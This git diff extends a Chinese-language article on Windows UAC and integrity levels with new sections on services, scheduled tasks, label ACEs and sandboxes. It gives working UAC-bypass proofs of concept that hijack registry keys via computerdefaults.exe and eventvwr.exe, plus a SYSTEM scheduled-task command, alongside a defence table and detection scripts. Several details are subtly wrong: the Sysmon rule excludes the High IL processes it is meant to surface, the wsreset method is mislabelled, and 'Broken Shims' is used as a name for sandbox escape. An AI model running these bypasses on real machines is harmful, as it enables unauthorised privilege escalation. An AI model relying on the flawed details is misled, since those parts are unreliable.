@@ -325,6 +325,98 @@ typedef struct _TOKEN_MANDATORY_LABEL {
 
 **安全关键点**：`appinfo.dll`运行在High IL环境中，是UAC提升流程的核心守护者。攻击者若能控制`appinfo.dll`的加载路径或其配置，即可绕过UAC提示。此外，`consent.exe`以SYSTEM IL运行（比High更高），确保其不会被High IL的恶意进程注入。
 
+### 3.7 UAC在服务与计划任务场景中的行为
+
+Windows服务（Service）与计划任务（Scheduled Task）的运行机制与UAC存在显著区别，理解这些差异对于提权路径分析至关重要：
+
+**一、Windows服务与UAC**
+
+服务进程由服务控制管理器（Service Control Manager, SCM）负责启动，SCM以SYSTEM权限运行。服务默认运行在SYSTEM账户或服务账户下，其完整性级别为System IL，**完全不经过UAC令牌拆分流程**。这意味着：
+
+```
+UAC对进程的影响范围（按启动方式划分）：
+├── 交互式登录进程（Explorer等）→ 受UAC拆分令牌影响
+├── 通过ShellExecute创建的进程 → 受UAC提升策略影响
+├── 服务进程（SCM/服务主机）→ 不受UAC影响，默认SYSTEM IL
+└── 计划任务 → 取决于任务配置的账户和权限
+```
+
+因此，攻击者获得SYSTEM权限后，其进程的完整性级别天然为System IL，无需任何UAC交互即可访问绝大多数系统资源。这也是为什么"服务提权"（如烂土豆、PrintSpoofer等）能够直接绕过UAC体系——它们直接获取的是SYSTEM令牌而非High IL令牌。
+
+**二、计划任务与UAC**
+
+计划任务可以配置`Run with highest privileges`选项。当配置了该选项时，任务运行时的令牌包含完整特权并被提升到High IL，且**不会弹出UAC提示**，因为计划任务由任务计划程序服务（Schedule service）以SYSTEM身份启动。`schtasks`命令行工具的`/RL HIGHEST`参数对应此功能：
+
+```cmd
+:: 创建以最高权限运行的计划任务
+schtasks /create /tn "myTask" /tr "cmd.exe /c whoami /groups ^> C:\temp\out.txt" ^
+         /sc once /st 00:00 /rl highest /ru SYSTEM /f
+
+:: 立即运行
+schtasks /run /tn "myTask"
+```
+
+在入侵检测中，攻击者常利用计划任务实现持久化和提权，因此应重点监控`/rl highest`或`/ru SYSTEM`相关的任务创建日志（Event ID 4698对应计划任务注册）。
+
+**三、提升进程的UAC标志与完整性差异**
+
+区分以下三个概念对分析提权攻击非常关键：
+
+| 概念 | 说明 | 判断方式 |
+|------|------|----------|
+| 完整令牌（Full Token） | 未经过滤的原始令牌，包含所有SID和特权 | `whoami /priv` 或 Process Explorer |
+| 提升标志（Elevated） | 标记进程是否经过UAC提升（TokenIsElevated属性） | Process Explorer的"Elevated"列 |
+| 完整性级别（IL） | 进程的强制完整性等级 | `whoami /groups`中的S-1-16-*条目 |
+
+一个进程可能存在"完整令牌但未提升"的状态（例如`FilterAdministratorToken=0`时内置管理员的进程），此时其IL为High但`TokenIsElevated`标志为0。
+
+### 3.8 完整性标签ACE的二进制格式
+
+完整性标签在安全描述符中的存储形式为`SYSTEM_MANDATORY_LABEL_ACE`，是一种特殊的访问控制条目。其结构如下（来自Windows内核头文件）：
+
+```
+SYSTEM_MANDATORY_LABEL_ACE
+├── Header (4字节)
+│   ├── AceType = 0x11 (SYSTEM_MANDATORY_LABEL_ACE_TYPE)
+│   └── AceFlags = 0x00
+├── Mask (4字节)
+│   ├── 0x00000001 = SYSTEM_MANDATORY_LABEL_NO_WRITE_UP（禁止向上写）
+│   ├── 0x00000002 = SYSTEM_MANDATORY_LABEL_NO_READ_UP（禁止向上读）
+│   ├── 0x00000004 = SYSTEM_MANDATORY_LABEL_NO_EXECUTE_UP（禁止向上执行）
+│   └── 默认组合 = 0x01 (NO_WRITE_UP)
+└── SID（完整性SID）
+    └── S-1-16-<级别数值>
+```
+
+**边界行为详解**：
+
+- **默认行为**：一个对象即使没有显式完整性标签，也会继承其所在目录的标签。如果目录本身设置了`(OI)(CI)`继承标志，子对象会获得相同级别的标签ACE。
+- **NO_WRITE_UP（0x01）**：默认设置，防止低IL进程向更高IL的对象执行写操作。这也是UAC绕过必须绕开的根本约束。
+- **无标签对象**：理论上，未设置完整性标签的对象被视为Medium IL（S-1-16-8192），与Windows 8及之后的默认Medium令牌匹配。
+- **完整性级别差值检查**：MIC使用算术比较而非简单的相等比较。当调用者IL低于对象IL时，如果对象ACE设置了NO_WRITE_UP且执行的是写操作，则访问被拒绝；读操作则需要查看对象的NO_READ_UP标志。
+
+使用`icacls`的`/setintegritylevel`命令时，系统实际上是在执行`SeSetObjectSecurity`，修改ACL中的完整性标签ACE。攻击者若拥有对象的`WRITE_DAC`权限，可以主动降低其完整性级别以实现修改。
+
+### 3.9 完整性级别与沙箱（Sandbox）的关系
+
+现代Windows浏览器和Office等应用的沙箱机制大量依赖完整性级别：
+
+| 沙箱宿主 | 完整性级别 | 实现方式 |
+|----------|------------|----------|
+| 旧版IE保护模式（LoRIE） | Low IL | 使用Low完整性令牌运行浏览器渲染进程 |
+| Microsoft Edge（旧版） | Low IL | AppContainer + Low IL组合 |
+| Adobe Reader保护模式 | Low IL（部分版本） | 调用方令牌直接设Low |
+| 新版Edge/Chrome | AppContainer | AppContainer SID + Low IL |
+| Windows Defender Application Guard | Med~High | 基于容器（Container）隔离 |
+
+据微软官方文档，Chrome（及Chromium内核浏览器）的渲染进程运行在Low IL，沙箱进程必须通过IPC（进程间通信）通道才能完成特权操作。在Pwn2Own和日常漏洞利用中，"Low IL逃逸"（Broken Shims）是指攻击者从Low IL沙箱逃逸至Medium IL的过程；而"UAC绕过"则是从Medium IL提升到High IL。攻击链往往由多个环节串联：
+
+```
+Low IL（沙箱）→ Medium IL（逃逸沙箱）→ High IL（UAC绕过）→ System IL（服务提权）
+```
+
+每一层用相同的"令牌/完整性"机制约束，这也是把UAC与完整性级别放在同一篇文章剖析的原因——它们共同构成Windows"由低到高"的整个权限阶梯。
+
 ## 4. 实战与示例
 
 ### 4.1 查看当前令牌与完整性级别
@@ -465,6 +557,142 @@ Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
 在特定Windows版本中，当Windows Defender的进程以High IL运行时，可通过修改其加载路径或利用其信任的DLL加载行为进行绕过。已知技术包括通过`MpCmdRun.exe`的信任关系间接提升权限。
 
 ### 4.3 PsExec与完整性级别
+
+Sysinternals的PsExec工具可以指定进程的完整性级别：
+
+```cmd
+:: 以High IL运行命令
+psexec -h cmd.exe
+:: -h 参数表示以High IL运行进程
+
+:: 以System IL运行命令
+psexec -s cmd.exe
+:: -s 参数表示以SYSTEM账户运行
+
+:: 查看结果
+whoami /groups | findstr "S-1-16-"
+:: 应显示 S-1-16-12288（High）或 S-1-16-16384（System）
+```
+
+### 4.4 完整性级别强制失效验证实验
+
+以下实验演示完整性级别如何在实际访问控制中发挥作用。**全程在隔离实验机上进行**。
+
+```powershell
+# 实验目的：证明Medium IL进程无法写入受保护目录
+
+# 步骤1：确认当前进程完整性级别为Medium
+whoami /groups /fo list | findstr "S-1-16-"
+# 看到 "S-1-16-8192" 即确认当前为Medium IL
+
+# 步骤2：尝试直接写入C:\Windows（受高完整性保护的目录）
+try {
+    Set-Content -Path "C:\Windows\test_write.txt" -Value "test" -ErrorAction Stop
+    Write-Host "写入成功（异常情况，需要排查）"
+} catch {
+    Write-Host "写入被拒绝：$($_.Exception.Message)"
+    # 预期输出：拒绝访问（Access is denied）
+    # 根本原因：token中的Medium IL < System32继承的High IL
+}
+
+# 步骤3：使用UAC提升后再尝试写入
+# 右键"以管理员身份运行"PowerShell，确认IL已变为High
+# 然后再执行：
+Set-Content -Path "C:\Windows\test_write.txt" -Value "test"
+Write-Host "写入成功（High IL获得写权限）"
+
+# 步骤4：清理
+Remove-Item "C:\Windows\test_write.txt" -Force -ErrorAction SilentlyContinue
+```
+
+**实验结果解读**：步骤2被拒绝的原因不仅是DACL（虽然默认DACL也拒绝标准用户写入System32），更重要的是完整性级别约束。即使通过DACL授予了Medium IL进程对System32目录的写权限，只要该目录设有High IL的完整性标签（默认System32目录确实如此），Medium IL进程的写操作仍会被MIC检查拒绝。这就是"即使DACL允许、MIC也会兜底"的双层防御。
+
+### 4.5 其他已知UAC绕过技术与防御对照
+
+**一、基于组件服务（Component-Based Servicing）的绕过**
+
+利用`wsreset.exe`（Windows Store重置组件，具有AutoElevate属性）配合DLL劫持：
+
+```
+┌─────────────────────────────────────────────────────┐
+│  UAC绕过：wsreset.exe方式                            │
+├─────────────────────────────────────────────────────┤
+│ 1. wsreset.exe 位于 System32，声明 requireAdmin     │
+│ 2. 攻击者在 HKCU\Software\Classes\ActivatableClasses\│
+│    Package\...\MsixInstaller\Instance 下设置数据      │
+│ 3. 将进程拦截键指向恶意DLL                           │
+│ 4. 运行wsreset.exe（自动提升，无UAC提示）            │
+│ 5. 恶意DLL在High IL下被加载并执行                    │
+└─────────────────────────────────────────────────────┘
+```
+
+**二、基于`computerdefaults.exe`的绕过**
+
+`computerdefaults.exe`会自动提升并读取`HKCU\Software\Classes\ms-settings\Shell\Open\command`：
+
+```powershell
+# POC（概念验证，仅限授权环境）
+$key = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+Set-ItemProperty -Path $key -Name "(Default)" `
+    -Value "powershell.exe -nop -w hidden -c whoami /groups" -Force
+Start-Process "C:\Windows\System32\computerdefaults.exe"
+# 观察新出现的powershell进程的完整性级别应显示High (S-1-16-12288)
+```
+
+**三、`eventvwr.exe`（事件查看器）方式**
+
+`eventvwr.exe`自动提升并加载`HKCU\Software\Classes\mscfile\Shell\open\command`：
+
+```powershell
+$key = "HKCU:\Software\Classes\mscfile\Shell\open\command"
+Set-ItemProperty -Path $key -Name "(Default)" -Value "cmd.exe" -Force
+Start-Process "C:\Windows\System32\eventvwr.exe"
+```
+
+**四、防御对照表**
+
+| 绕过技术 | 核心原因（为什么能成功） | 检测要点 | 修复建议 |
+|----------|--------------------------|----------|----------|
+| fodhelper/computerdefaults | HKCU优先于HKLM的注册表搜索顺序 + AutoElevate | Sysmon EventID 1监控进程父进程为fodhelper/computerdefaults；EventID 12/13监控ms-settings键 | 组策略收紧HKCU\Software\Classes写入权限；启用AppLocker针对脚本组件 |
+| eventvwr mscfile | 同上原理，利用mscfile类键 | 监控mscfile、mmc有关键值变化 | 限制HKCU Classes写权限 |
+| sdclt 备份组件 | sdclt.exe的trusted路径被伪造 | 监控sdclt进程异常活动 | 升级到最新Windows版本 |
+| DLL搜索顺序劫持 | PATH目录可被写入 + AutoElevate进程加载 | Sysmon EventID 7监控DLL加载的异常路径 | 修复可写PATH目录，启用SafeDllSearchMode |
+| COM提升接口 | COM Elevation注册表项存在 | EventID 4692/4694审计 | 审核并移除非必要COM Elevation注册 |
+| 虚假消息（UI-based） | consent.exe弹窗可被模拟 | 审计交互式登录时段UAC弹窗 | 使用安全桌面模式（ConsentPromptBehaviorAdmin=2） |
+| 门卫进程操控 | appinfo/consent交互链可被中间人 | 监控appinfo.dll、consent.exe的异常 | 修补系统补丁，企业端点检测 |
+
+### 4.6 从入侵检测视角识别UAC绕过
+
+防御者需要从多个日志维度关联分析才能发现UAC绕过行为：
+
+```powershell
+# 1. 检测"ms-settings"等注册表键的异常写入（Sysmon EventID 12/13）
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -ErrorAction SilentlyContinue |
+    Where-Object { $_.Message -match "ms-settings|mscfile|HKCU\\\\Software\\\\Classes" } |
+    Select-Object TimeCreated, Id, Message | Format-List
+
+# 2. 关注以AutoElevate进程为父进程的异常子进程
+Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id=1 } |
+    Where-Object {
+        $_.Message -match "fodhelper|computerdefaults|eventvwr|sdclt|wsreset" -and
+        $_.Message -match "ParentImage" 
+    } | Select-Object TimeCreated, Message | Format-List
+
+# 3. 核查可疑的完整性级别跃升（EventID 4696-主令牌分配）
+Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4696 } |
+    Select-Object TimeCreated, @{N='Account';E={$_.Properties[0].Value}}, `
+        @{N='NewToken';E={$_.Properties[1].Value}} | Format-List
+
+# 4. 使用Sysmon的IntegrityLevel字段过滤High IL进程
+# 在Sysmon配置XML中添加：
+# <RuleGroup name="UAC" groupRelation="or">
+#   <ProcessCreate onmatch="exclude">
+#     <IntegrityLevel condition="is">High</IntegrityLevel>
+#   </ProcessCreate>
+# </RuleGroup>
+```
+
+**检测盲区提醒**：攻击者常用`whoami /groups`、`Get-Location`等无害命令验证提权结果，这些命令本身不产生高价值告警，因此必须依赖父进程链（ParentProcess）与命令行的联合分析。例如正常使用中`fodhelper.exe`极少被直接交互式运行，一旦出现以它为父进程的cmd/powershell，应视为高置信度告警。
 
 Sysinternals的PsExec工具可以指定进程的完整性级别：
 
